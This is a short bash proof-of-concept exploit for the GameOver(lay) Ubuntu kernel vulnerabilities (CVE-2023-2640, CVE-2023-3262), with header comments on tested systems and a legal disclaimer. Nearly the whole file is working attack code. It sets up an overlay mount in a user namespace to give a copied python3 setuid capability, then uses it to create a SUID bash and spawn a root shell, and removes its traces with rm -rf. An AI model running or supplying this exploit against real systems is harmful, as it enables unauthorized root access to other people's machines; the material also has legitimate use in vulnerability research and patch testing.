#!/bin/bash
################################################################################
# $Id: g1vi.exploit 2024-02-03 06:12:40 +0100 .m0rph $
################################################################################
# Original:
#  CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
#  by g1vi https://github.com/g1vi
#  October 2023
# -----------------------------------------------------------------------------
# Tested under:
#  Debian 12.2.0, kernel 6.1.0-17-amd :: NO WAY !!!
#  Kali  2024.01, kernel 6.6.9-1kali1 :: NO WAY !!!
# -----------------------------------------------------------------------------
# Should be woking under Ubuntu:
#  kernel 6.2.0  ::  23.04 (Lunar Lobster), 22.04 LTS (Jammy Jellyfish)
#  kernel 5.19.0 ::  22.10 (Kinetic Kudu),  22.04 LTS (Jammy Jellyfish)
#  kernel 5.4.0  ::  22.04 (Local Fossa),   18.04 LTS (Bionic Beaver)
################################################################################
# Disclaimer:
#  This Proof of Concept (PoC) is intended for research and educational purposes
#  only. Any actions taken based on the information provided in this gist are
#  solely at the user's own risk. The vulnerabilities described in this report
#  should not be exploited in any unauthorized or malicious manner. The authors
#  and contributors are not responsible for any misuse or damage that may
#  result from the use of this information.
#
# Please keep in mind that using malicious software and causing damage at
# foreign systems without being ordered or charged is ILLEGAL and will result in
# law enforcement! The worst case is that you end up in PRISON!
################################################################################

# when it didn't work, nothing has been deleted in the end :-\
rm -rf l u w m

zcmd="mkdir l u w m && cp /usr/bin/python3 l/;"
zcmd="${zcmd}/usr/sbin/setcap cap_setuid+eip l/python3;"
zcmd="${zcmd}mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m "
zcmd="${zcmd}&& touch m/*"

bcmd="cp /bin/bash /var/tmp/bash && "
bcmd="${bcmd}chmod 4755 /var/tmp/bash && "
bcmd="${bcmd}/var/tmp/bash -p && "
bcmd="${bcmd}rm -rf l m u w /var/tmp/bash"

pcmd="import os;os.setuid(0);os.system('$bcmd')"

echo "[?] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"
unshare -rm zsh -c "$zcmd" && u/python3 -c "$pcmd"
